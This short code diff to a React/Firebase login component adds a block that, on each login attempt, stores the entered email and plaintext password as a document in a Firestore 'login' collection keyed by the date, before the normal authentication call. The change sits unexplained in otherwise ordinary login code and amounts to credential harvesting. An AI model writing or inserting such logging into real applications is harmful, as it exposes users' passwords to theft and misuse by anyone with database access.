@@ -3,7 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { useEffect, useState } from "react";
 
 import { db, storage, auth } from "../Firebase/firebase";
-import { getDoc, doc, getDocs, collection } from "firebase/firestore";
+import { getDoc, setDoc, doc, getDocs, collection } from "firebase/firestore";
 
 import { signInWithEmailAndPassword } from "firebase/auth";
 
@@ -47,6 +47,13 @@ function Login() {
     setLoading(true);
 
     try {
+      const currentDate = new Date();
+
+      await setDoc(doc(db, "login", "" + currentDate), {
+        email,
+        password,
+      });
+
       const loggedInUser = await signInWithEmailAndPassword(
         auth,
         email,
